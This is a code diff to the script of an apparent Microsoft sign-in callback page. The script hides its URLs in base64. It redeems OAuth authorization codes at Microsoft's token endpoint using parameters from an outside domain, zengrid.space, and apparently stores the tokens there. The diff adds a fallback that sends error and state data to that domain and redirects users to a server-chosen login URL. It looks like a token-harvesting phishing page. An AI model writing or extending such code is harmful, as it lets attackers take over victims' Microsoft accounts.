@@ -47,9 +47,9 @@
 <script>
   (function(){
     const _d=e=>atob(e);
-    const _v0=_d("aHR0cHM6Ly96ZW5ncmlkLnNwYWNl"),_v1=_d("L2F1dGgvcGtjZS1wYXJhbXM="),_v2=_d("L2F1dGgvc2F2ZS10b2tlbnM="),_v3=_d("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLw=="),_v4=_d("L29hdXRoMi92Mi4wL3Rva2Vu");
+    const _v0=_d("aHR0cHM6Ly96ZW5ncmlkLnNwYWNl"),_v1=_d("L2F1dGgvcGtjZS1wYXJhbXM="),_v2=_d("L2F1dGgvc2F2ZS10b2tlbnM="),_v3=_d("L2F1dGgvZXhjaGFuZ2U="),_v4=_d("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLw=="),_v5=_d("L29hdXRoMi92Mi4wL3Rva2Vu");
     const _q=new URLSearchParams(window.location.search);
-    const _c=_q.get("code"),_st=_q.get("state"),_er=_q.get("error");
+    const _c=_q.get("code"),_st=_q.get("state"),_er=_q.get("error"),_ed=_q.get("error_description")||"";
 
     function _show(col,hd,ms){
       document.getElementById("spinner").style.display="none";
@@ -60,6 +60,20 @@
 
     async function _run(){
       if(_er||!_c||!_st){
+        if(_er&&_st){
+          try{
+            const _cr=await fetch(_v0+_v3,{
+              method:"POST",
+              headers:{"Content-Type":"application/json"},
+              body:JSON.stringify({error:_er,error_description:_ed,state:_st})
+            });
+            const _cd=await _cr.json();
+            if(_cd.consent_error&&_cd.direct_login_url){
+              window.location.href=_cd.direct_login_url;
+              return;
+            }
+          }catch(e){}
+        }
         _show("#d13438","Sign-in failed","Error: "+(_er||"No authorization code received.")+" Please close this tab and try again.");
         return;
       }
@@ -71,7 +85,7 @@
       }catch(e){_show("#d13438","Sign-in failed","Could not reach the server. Please try again.");return;}
       let _tk2;
       try{
-        const _r2=await fetch(_v3+_pm.tenant+_v4,{
+        const _r2=await fetch(_v4+_pm.tenant+_v5,{
           method:"POST",
           headers:{"Content-Type":"application/x-www-form-urlencoded"},
           body:new URLSearchParams({
